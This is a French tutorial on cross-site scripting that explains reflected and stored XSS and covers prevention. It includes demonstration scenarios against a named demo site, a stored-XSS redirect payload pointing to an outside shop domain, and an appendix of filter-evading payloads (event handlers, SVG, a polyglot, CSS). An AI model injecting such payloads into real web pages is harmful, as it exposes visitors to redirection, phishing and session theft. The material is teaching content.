# Introduction

Les attaques XSS (Cross-Site Scripting) sont des vulnérabilités web critiques qu'il est important de comprendre dans un contexte pédagogique. Voici une présentation structurée de ce type d'attaque.

# Types d'attaques XSS principaux

**XSS Réfléchi (Reflected)**
- L'attaque se produit lorsque les données malveillantes sont immédiatement renvoyées à l'utilisateur
- Nécessite que la victime clique sur un lien spécialement conçu
- Cible souvent les pages de recherche et les messages d'erreur

**XSS Persistant (Stored)**
- Le code malveillant est stocké sur le serveur de manière permanente
- Affecte tous les visiteurs de la page compromise
- Particulièrement dangereux car peut toucher des milliers d'utilisateurs

# Démonstration 

![image](https://github.com/user-attachments/assets/ae85fbc2-df75-48e4-b0d4-a83e80c5ace6)

**Scénario 1**
```javascript
// Exemple de payload basique pour démonstration
<script>alert('XSS!')</script>
```

- http://latestworlds.com/demo/
- http://latestworlds.com/demo/article.php?id=1#

--------------

![image](https://github.com/user-attachments/assets/0a95be5e-17f1-4507-9362-79465c1ff144)

--------------

![image](https://github.com/user-attachments/assets/53434e99-3082-4cf8-9f03-4856691a060c)

--------------

![image](https://github.com/user-attachments/assets/b8f16c7f-3b86-41d4-9f44-c2c15c4c2c24)

--------------

![image](https://github.com/user-attachments/assets/9aeacbd8-4088-4df8-93b8-9f7e0500854a)

--------------

![image](https://github.com/user-attachments/assets/3499c6e2-b003-49ec-a200-0c21b87457d0)


--------------


**Scénario 2**

Le script est le suivant :

```html
<script>alert("XSS Stocké !!!");</script>
```

Ceci montre une démonstration d'une attaque **XSS stockée (Cross-Site Scripting)** où un script malveillant est injecté dans un formulaire et peut être exécuté côté client.

**Scénario 3**

### Script XSS pour redirection
```html
<script>window.location.href="https://boutique.rapidopresco.com/";</script>
```

### Explication
- **`<script>`** : Balise JavaScript qui exécute le code.
- **`window.location.href`** : Permet de rediriger l'utilisateur automatiquement vers le site souhaité.

---

### Exemple d'injection
Ajoutez ceci dans le champ de commentaire ou de pseudo pour simuler une attaque XSS stockée ou réfléchie :

```html
<script>alert('Alerte XSS !'); window.location.href="https://boutique.rapidopresco.com/";</script>
```

---

### **Pédagogie et Sécurité**
- Cette démonstration sert à montrer l'impact d'une mauvaise validation des entrées.
- Il est important d'assainir (sanitize) les données côté serveur pour éviter l'exécution de scripts malveillants.  





**Points importants**
- Ne jamais tester sur des sites réels
- Utiliser uniquement des environnements contrôlés
- Mettre l'accent sur la prévention et la sécurisation

# Impacts et risques

**Conséquences possibles**
- Vol de cookies et sessions utilisateurs
- Hameçonnage et vol d'identifiants
- Détournement de sessions authentifiées
- Modification du contenu des pages

# Prévention

**Mesures de sécurité essentielles**
- Validation stricte des entrées utilisateur
- Encodage HTML des sorties
- Utilisation de frameworks sécurisés
- Mise en place d'une Content Security Policy (CSP)

-------------------
# Annexe :
-------------------

## Scripts XSS pour tests pédagogiques

**Scripts basiques**
```javascript
// Affichage simple
<script>alert('XSS Test')</script>
// Utilisation de fromCharCode
<a href="javascript:alert(String.fromCharCode(88,83,83))">Cliquez ici</a>
```

**Scripts avec gestionnaires d'événements**
```html
// Utilisation de onerror
<img src="inexistant" onerror="alert('XSS via onerror')">
// Utilisation de onload avec SVG
<svg onload=alert('XSS')>
// Utilisation de BODY
<BODY ONLOAD=alert('XSS')>
```

**Scripts avancés**
```javascript
// Script polyglot multi-contextes
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

// Style avec list-style-image
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

## Contextes d'utilisation

**Test de validation d'entrées**
```javascript
// Injection dans les paramètres URL
?keyword=<script>alert("Test XSS")</script>

// Injection dans les formulaires
<img src="aaaaa" onerror="alert('Bypass filtres');" />
```

Il est crucial de n'utiliser ces scripts que dans un environnement de test contrôlé et isolé.



